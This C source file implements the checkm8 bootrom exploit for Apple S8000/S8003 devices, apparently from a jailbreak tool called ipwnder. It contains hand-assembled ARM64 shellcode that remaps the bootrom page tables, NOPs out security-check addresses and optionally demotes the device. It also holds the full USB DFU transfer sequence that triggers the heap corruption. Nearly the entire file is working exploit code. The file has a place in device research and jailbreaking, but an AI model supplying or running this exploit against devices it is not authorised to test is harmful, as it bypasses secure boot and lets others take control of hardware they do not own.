
#include <iousb.h>
#include <common.h>
#include <checkm8_s8000.h>

static unsigned char blank[2048];
static unsigned char payload[2048];
static int payloadLen=2048;

static int checkm8_payload(io_client_t client)
{
    
    DEBUGLOG("[%s] making checkm8 payload", __FUNCTION__);
    dfu_overwrite_t overwrite;
    void *shc;
    
    uint64_t demote_flag = 0;
    uint32_t PWND_STR0 = 0x4e575020; // ' PWN'
    uint32_t PWND_STR1 = 0x695b3a44; // 'D:[i'
    uint32_t PWND_STR2 = 0x646e7770; // 'pwnd'
    uint32_t PWND_STR3 = 0x005d7265; // 'er]\x00'
    
    memset(&overwrite, '\0', sizeof(overwrite));
    
    if(client->isDemotion == true) {
        demote_flag = 1;
        PWND_STR1 = 0x645b3a44; // 'D:[d'
        PWND_STR2 = 0x746f6d65; // 'emot'
        PWND_STR3 = 0x005d6465; // 'ed]\x00'
    }
    
    // create task
    overwrite.synopsys_task.id = 5;
    strcpy(overwrite.synopsys_task.name, "usb");
    overwrite.synopsys_task.magic_1 = TASK_MAGIC_1;
    overwrite.synopsys_task.stack_len = TASK_STACK_MIN;
    overwrite.synopsys_task.routine = SYNOPSYS_ROUTINE_ADDR;
    overwrite.synopsys_task.stack_base = IO_BUFFER_ADDR + offsetof(dfu_overwrite_t, fake_task);
    overwrite.synopsys_task.ret_waiters_list.prev = overwrite.synopsys_task.ret_waiters_list.next = overwrite.synopsys_task.stack_base + offsetof(dfu_task_t, queue_list);
    
    overwrite.heap_block.prev_sz = sizeof(overwrite.synopsys_task) / sizeof(overwrite.heap_block) + 1;
    overwrite.heap_block.this_sz = overwrite.synopsys_task.stack_len / sizeof(overwrite.heap_block) + 2;
    
    overwrite.fake_task.id = 6;
    overwrite.fake_task.irq_dis_cnt = 1;
    overwrite.fake_task.state = TASK_RUNNING;
    overwrite.fake_task.magic_1 = TASK_MAGIC_1;
    strcpy(overwrite.fake_task.name, "ipwnder");
    shc = overwrite.fake_task.arch.shc;
    
    // s8000 & s8003
    overwrite.fake_task.arg = 0;
    int i=0;
    
    // _main:
    *(uint32_t*)(shc+i) = INSN_NOP;   i+=4; // HACK? mov x19, #0: 0xd2800013
    *(uint32_t*)(shc+i) = 0xa9bf7bfd; i+=4; // stp   x29, x30, [sp, #-0x10]!
    *(uint32_t*)(shc+i) = 0x910003fd; i+=4; // mov   x29, sp
    
    *(uint32_t*)(shc+i) = 0x58000960; i+=4; // ldr   x0, =gUSBDescriptors
    *(uint32_t*)(shc+i) = 0xa9400400; i+=4; // ldp   x0, x1, [x0]
    *(uint32_t*)(shc+i) = 0x10000782; i+=4; // adr   x2, USB_DESCRIPTOR
    *(uint32_t*)(shc+i) = 0xa9401043; i+=4; // ldp   x3, x4, [x2]
    *(uint32_t*)(shc+i) = 0xa9411043; i+=4; // ldp   x3, x4, [x2, #0x10]
    *(uint32_t*)(shc+i) = 0x58000900; i+=4; // ldr   x0, =gUSBSerialNumber
    
    // _find_zero_loop:
    *(uint32_t*)(shc+i) = 0x91000400; i+=4; // add   x0, x0, #1
    *(uint32_t*)(shc+i) = 0x39400001; i+=4; // ldrb  w1, [x0]
    *(uint32_t*)(shc+i) = 0x35ffffc1; i+=4; // cbnz  w1, _find_zero_loop
    *(uint32_t*)(shc+i) = 0x100007a1; i+=4; // adr   x1, PWND_STRING
    *(uint32_t*)(shc+i) = 0xa9400c22; i+=4; // ldp   x2, x3, [x1]
    *(uint32_t*)(shc+i) = 0xa9000c02; i+=4; // stp   x2, x3, [x0]
    *(uint32_t*)(shc+i) = 0x58000820; i+=4; // ldr   x0, =gUSBSerialNumber
    *(uint32_t*)(shc+i) = 0x58000841; i+=4; // ldr   x1, =usb_create_string_descriptor
    *(uint32_t*)(shc+i) = 0xd63f0020; i+=4; // blr   x1
    *(uint32_t*)(shc+i) = 0x58000841; i+=4; // ldr   x1, =gUSBSRNMStringDescriptor
    *(uint32_t*)(shc+i) = 0x39000020; i+=4; // strb  w0, [x1]
    *(uint32_t*)(shc+i) = 0x58000840; i+=4; // ldr   x0, =demote_flag
    *(uint32_t*)(shc+i) = 0xf100041f; i+=4; // cmp   x0, #1
    *(uint32_t*)(shc+i) = 0x54000121; i+=4; // bne   _eclipsa
    
    // _demotion:
    *(uint32_t*)(shc+i) = 0x58000821; i+=4; // ldr   x1, =gDemotionRegister
    *(uint32_t*)(shc+i) = 0xb9400020; i+=4; // ldr   w0, [x1]
    *(uint32_t*)(shc+i) = 0x7200001f; i+=4; // tst   w0, #1
    *(uint32_t*)(shc+i) = 0x54000440; i+=4; // beq   _end
    *(uint32_t*)(shc+i) = 0xb9400020; i+=4; // ldr   w0, [x1]
    *(uint32_t*)(shc+i) = 0x121f7800; i+=4; // and   w0, w0, #0xfffffffe
    *(uint32_t*)(shc+i) = 0xb9000020; i+=4; // str   w0, [x1]
    *(uint32_t*)(shc+i) = 0x1400001e; i+=4; // b     _end
    
    // _eclipsa:
    *(uint32_t*)(shc+i) = 0xd50343df; i+=4; // msr   daifset, #0x3
    *(uint32_t*)(shc+i) = 0xd5033fdf; i+=4; // isb
    
    *(uint32_t*)(shc+i) = 0x58000720; i+=4; // ldr   x0, =VROM_PAGE_TABLE_ADDR
    *(uint32_t*)(shc+i) = 0xf940000a; i+=4; // ldr   x10, [x0]
    *(uint32_t*)(shc+i) = 0xb24b054a; i+=4; // orr   x10, x10, #0x60000000000000
    *(uint32_t*)(shc+i) = 0x9278f94a; i+=4; // and   x10, x10, #0xffffffffffffff7f
    *(uint32_t*)(shc+i) = 0xf900000a; i+=4; // str   x10, [x0]
    *(uint32_t*)(shc+i) = 0xd5033f9f; i+=4; // dsb   sy
    *(uint32_t*)(shc+i) = 0xd50e871f; i+=4; // tlbi  alle3
    *(uint32_t*)(shc+i) = 0xd5033f9f; i+=4; // dsb   sy
    *(uint32_t*)(shc+i) = 0xd5033fdf; i+=4; // isb
    
    *(uint32_t*)(shc+i) = 0x18000649; i+=4; // ldr   w9, =INSN_NOP
    *(uint32_t*)(shc+i) = 0x58000673; i+=4; // ldr   x19, =PATCH_ADDR_0
    *(uint32_t*)(shc+i) = 0x58000694; i+=4; // ldr   x20, =PATCH_ADDR_1
    *(uint32_t*)(shc+i) = 0x580006b5; i+=4; // ldr   x21, =PATCH_ADDR_2
    *(uint32_t*)(shc+i) = 0x580006d6; i+=4; // ldr   x22, =PATCH_ADDR_3
    *(uint32_t*)(shc+i) = 0xb9000269; i+=4; // str   w9, [x19]
    *(uint32_t*)(shc+i) = 0xb9000289; i+=4; // str   w9, [x20]
    *(uint32_t*)(shc+i) = 0xb90002a9; i+=4; // str   w9, [x21]
    *(uint32_t*)(shc+i) = 0xb90002c9; i+=4; // str   w9, [x22]
    
    *(uint32_t*)(shc+i) = 0x9249f54a; i+=4; // and   x10, x10, #0xff9fffffffffffff
    *(uint32_t*)(shc+i) = 0xb279014a; i+=4; // orr   x10, x10, #0x80
    *(uint32_t*)(shc+i) = 0xf900000a; i+=4; // str   x10, [x0]
    *(uint32_t*)(shc+i) = 0xd5033f9f; i+=4; // dsb   sy
    *(uint32_t*)(shc+i) = 0xd50e871f; i+=4; // tlbi  alle3
    *(uint32_t*)(shc+i) = 0xd5033f9f; i+=4; // dsb   sy
    *(uint32_t*)(shc+i) = 0xd5033fdf; i+=4; // isb
    
    *(uint32_t*)(shc+i) = 0xd50343ff; i+=4; // msr   daifclr, #0x3
    *(uint32_t*)(shc+i) = 0xd5033fdf; i+=4; // isb
    
    // _end:
    *(uint32_t*)(shc+i) = 0xd508751f; i+=4; // sys  #0, c7, c5, #0
    *(uint32_t*)(shc+i) = 0xd5033f9f; i+=4; // dsb  sy
    *(uint32_t*)(shc+i) = 0xd5033fdf; i+=4; // isb
    
    *(uint32_t*)(shc+i) = 0xa8c17bfd; i+=4; // ldp  x29, x30, [sp], #0x10
    *(uint32_t*)(shc+i) = 0xd65f03c0; i+=4; // ret
    
    // USB_DESCRIPTOR:
    *(uint32_t*)(shc+i) = 0x00190209; i+=4;
    *(uint32_t*)(shc+i) = 0x80050101; i+=4;
    *(uint32_t*)(shc+i) = 0x000409fa; i+=4;
    *(uint32_t*)(shc+i) = 0x01fe0000; i+=4;
    *(uint32_t*)(shc+i) = 0x21070000; i+=4;
    *(uint32_t*)(shc+i) = 0x00000a01; i+=4;
    *(uint32_t*)(shc+i) = 0x00000008; i+=4;
    *(uint32_t*)(shc+i) = 0x00000000; i+=4;
    
    // PWND_STRING:
    *(uint32_t*)(shc+i) = PWND_STR0;  i+=4;
    *(uint32_t*)(shc+i) = PWND_STR1;  i+=4;
    *(uint32_t*)(shc+i) = PWND_STR2;  i+=4;
    *(uint32_t*)(shc+i) = PWND_STR3;  i+=4;
    *(uint32_t*)(shc+i) = INSN_NOP;   i+=4; // nop
    
    // OFFSETS:
    *(uint64_t*)(shc+i) = gUSBDescriptors; i+=8;
    *(uint64_t*)(shc+i) = gUSBSerialNumber; i+=8;
    *(uint64_t*)(shc+i) = usb_create_string_descriptor; i+=8;
    *(uint64_t*)(shc+i) = gUSBSRNMStringDescriptor; i+=8;
    *(uint64_t*)(shc+i) = demote_flag; i+=8;
    *(uint64_t*)(shc+i) = gDemotionRegister; i+=8;
    *(uint64_t*)(shc+i) = VROM_PAGE_TABLE_ADDR; i+=8;
    *(uint64_t*)(shc+i) = INSN2_NOP_NOP; i+=8; // INSN_NOP_NOP
    *(uint64_t*)(shc+i) = PATCH_ADDR_0; i+=8;
    *(uint64_t*)(shc+i) = PATCH_ADDR_1; i+=8;
    *(uint64_t*)(shc+i) = PATCH_ADDR_2; i+=8;
    *(uint64_t*)(shc+i) = PATCH_ADDR_3; i+=8;
    
    overwrite.fake_task.magic_0 = TASK_STACK_MAGIC;
    overwrite.fake_task.arch.lr = ARCH_TASK_TRAMP_ADDR;
    overwrite.fake_task.stack_len = overwrite.synopsys_task.stack_len;
    overwrite.fake_task.stack_base = overwrite.synopsys_task.stack_base;
    overwrite.fake_task.arch.sp = overwrite.fake_task.stack_base + overwrite.fake_task.stack_len;
    overwrite.fake_task.routine = overwrite.fake_task.stack_base + offsetof(dfu_task_t, arch.shc);
    overwrite.fake_task.queue_list.prev = overwrite.fake_task.queue_list.next = IO_BUFFER_ADDR + offsetof(dfu_task_t, ret_waiters_list);
    overwrite.fake_task.ret_waiters_list.prev = overwrite.fake_task.ret_waiters_list.next = overwrite.fake_task.stack_base + offsetof(dfu_task_t, ret_waiters_list);
    
    payloadLen = sizeof(overwrite) - offsetof(dfu_overwrite_t, synopsys_task.callout);
    memcpy(payload, (const void*)&overwrite + offsetof(dfu_overwrite_t, synopsys_task.callout), payloadLen);
    
    return 0;
}

static int eclipsa_payload(io_client_t client)
{
    // 0x7ff's eclipsa style
    // original: https://github.com/0x7ff/eclipsa
    
    DEBUGLOG("[%s] making eclipsa payload", __FUNCTION__);
    dfu_overwrite_t overwrite;
    UInt32 *shc;
    
    memset(&overwrite, '\0', sizeof(overwrite));
    
    // create task
    overwrite.synopsys_task.id = 5;
    strcpy(overwrite.synopsys_task.name, "usb");
    overwrite.synopsys_task.magic_1 = TASK_MAGIC_1;
    overwrite.synopsys_task.stack_len = TASK_STACK_MIN;
    overwrite.synopsys_task.routine = SYNOPSYS_ROUTINE_ADDR;
    overwrite.synopsys_task.stack_base = IO_BUFFER_ADDR + offsetof(dfu_overwrite_t, fake_task);
    overwrite.synopsys_task.ret_waiters_list.prev = overwrite.synopsys_task.ret_waiters_list.next = overwrite.synopsys_task.stack_base + offsetof(dfu_task_t, queue_list);
    
    overwrite.heap_block.prev_sz = sizeof(overwrite.synopsys_task) / sizeof(overwrite.heap_block) + 1;
    overwrite.heap_block.this_sz = overwrite.synopsys_task.stack_len / sizeof(overwrite.heap_block) + 2;
    
    overwrite.fake_task.id = 6;
    overwrite.fake_task.irq_dis_cnt = 1;
    overwrite.fake_task.state = TASK_RUNNING;
    overwrite.fake_task.magic_1 = TASK_MAGIC_1;
    strcpy(overwrite.fake_task.name, "ipwnder");
    shc = overwrite.fake_task.arch.shc;
    
    // s8000 & s8003
    overwrite.fake_task.arg = VROM_PAGE_TABLE_ADDR;
    
    *shc++ = 0xd50343df; // msr     daifset, #0x3
    *shc++ = 0xd5033fdf; // isb
    
    *shc++ = 0xf940000a; // ldr     x10, [x0]
    *shc++ = 0xb24b054a; // orr     x10, x10, #0x60000000000000
    *shc++ = 0x9278f94a; // and     x10, x10, #0xffffffffffffff7f
    *shc++ = 0xf900000a; // str     x10, [x0]
    *shc++ = 0xd5033f9f; // dsb     sy
    *shc++ = 0xd50e871f; // tlbi
    *shc++ = 0xd5033f9f; // dsb     sy
    *shc++ = 0xd5033fdf; // isb
    
    *shc++ = 0x10000208; // adr     x8, INSN_NOP
    
    *shc++ = 0xb9400109; // ldr     w9, [x8]
    *shc++ = 0xb9000269; // str     w9, [x19]
    *shc++ = 0xb9000289; // str     w9, [x20]
    *shc++ = 0xb90002a9; // str     w9, [x21]
    *shc++ = 0xb90002c9; // str     w9, [x22]
    
    *shc++ = 0x9249f54a; // and     x10, x10, #0xff9fffffffffffff
    *shc++ = 0xb279014a; // orr     x10, x10, #0x80
    *shc++ = 0xf900000a; // str     x10, [x0]
    *shc++ = 0xd5033f9f; // dsb     sy
    *shc++ = 0xd50e871f; // tlbi
    *shc++ = 0xd5033f9f; // dsb     sy
    *shc++ = 0xd5033fdf; // isb
    
    *shc++ = 0xd50343ff; // msr     daifclr, #0x3
    *shc++ = 0xd5033fdf; // isb
    *shc++ = 0xd65f03c0; // ret
    
    *shc++ = INSN_NOP;
    
    overwrite.fake_task.arch.x[19] = PATCH_ADDR_0;
    overwrite.fake_task.arch.x[20] = PATCH_ADDR_1;
    overwrite.fake_task.arch.x[21] = PATCH_ADDR_2;
    overwrite.fake_task.arch.x[22] = PATCH_ADDR_3;
    overwrite.fake_task.magic_0 = TASK_STACK_MAGIC;
    overwrite.fake_task.arch.lr = ARCH_TASK_TRAMP_ADDR;
    overwrite.fake_task.stack_len = overwrite.synopsys_task.stack_len;
    overwrite.fake_task.stack_base = overwrite.synopsys_task.stack_base;
    overwrite.fake_task.arch.sp = overwrite.fake_task.stack_base + overwrite.fake_task.stack_len;
    overwrite.fake_task.routine = overwrite.fake_task.stack_base + offsetof(dfu_task_t, arch.shc);
    overwrite.fake_task.queue_list.prev = overwrite.fake_task.queue_list.next = IO_BUFFER_ADDR + offsetof(dfu_task_t, ret_waiters_list);
    overwrite.fake_task.ret_waiters_list.prev = overwrite.fake_task.ret_waiters_list.next = overwrite.fake_task.stack_base + offsetof(dfu_task_t, ret_waiters_list);
    
    payloadLen = sizeof(overwrite) - offsetof(dfu_overwrite_t, synopsys_task.callout);
    memcpy(payload, (const void*)&overwrite + offsetof(dfu_overwrite_t, synopsys_task.callout), payloadLen);
    
    return 0;
}

static void set_global_state(io_client_t client)
{
    transfer_t result;
    unsigned int val;
    UInt32 sent;
    
    memset(&blank, '\x41', 2048);
    
    val = 768;
    
    int i=0;
    while((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, blank, 2048, 0)) != 0x40){
        i++;
        DEBUGLOG("[%s] (*) retry: %x", __FUNCTION__, i);
        usleep(10000);
        result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 64);
        DEBUGLOG("[%s] (*) %x", __FUNCTION__, result.ret);
        usleep(10000);
    }
    
    DEBUGLOG("[%s] (1/3) val: %x", __FUNCTION__, val);
    
    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, blank, val, 100);
    DEBUGLOG("[%s] (2/3) %x", __FUNCTION__, result.ret);
    
    result = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
    DEBUGLOG("[%s] (3/3) %x", __FUNCTION__, result.ret);
}

static void heap_occupation(io_client_t client)
{
    transfer_t result;
    
    memset(&blank, '\0', 2048);
    
    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, payload, payloadLen, 100);
    DEBUGLOG("[%s] (1/2) %x", __FUNCTION__, result.ret);
    result = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
    DEBUGLOG("[%s] (2/2) %x", __FUNCTION__, result.ret);
}

int checkm8_s8000(io_client_t client, bool eclipsa)
{
    IOReturn res;
    transfer_t result;
    int r;
    
    if(eclipsa == true) {
        r = eclipsa_payload(client);
    } else {
        r = checkm8_payload(client);
    }
    
    if(r != 0) {
        ERROR("[%s] ERROR: Failed to generate payload!", __FUNCTION__);
        return -1;
    }
    
    memset(&blank, '\0', 2048);
    
    LOG_EXPLOIT_NAME("checkm8");
    
    result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 2048);
    usleep(1000);
    
    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
    res = io_reset(client);
    
    io_close(client);
    client = NULL;
    usleep(10000);
    get_device_time_stage(&client, 5, DEVICE_DFU, false);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG_PROGRESS("[%s] running set_global_state()", __FUNCTION__);
    set_global_state(client);
    
    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
    io_close(client);
    client = NULL;
    usleep(10000);
    get_device_time_stage(&client, 5, DEVICE_DFU, false);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG_PROGRESS("[%s] running heap_occupation()", __FUNCTION__);
    heap_occupation(client);
    
    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
    io_close(client);
    client = NULL;
    usleep(100000);
    get_device_time_stage(&client, 5, DEVICE_DFU, true);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    if(client->hasSerialStr == false) {
        read_serial_number(client); // For iOS 10 and lower
    }
    
    if(client->hasSerialStr != true) {
        ERROR("[%s] Serial number was not found!", __FUNCTION__);
        return -1;
    }

    if(eclipsa == true) {
        LOG_DONE("[%s] pwned?", __FUNCTION__);
        return 2;
    }
    
    if(client->devinfo.hasPwnd == true) {
        if(!strcmp(client->devinfo.pwnstr, "demoted")) {
            LOG_DONE("[%s] demoted!", __FUNCTION__);
            return 0;
        }
        LOG_DONE("[%s] pwned!", __FUNCTION__);
        return 1;
    }
    
    
    return -1;
}
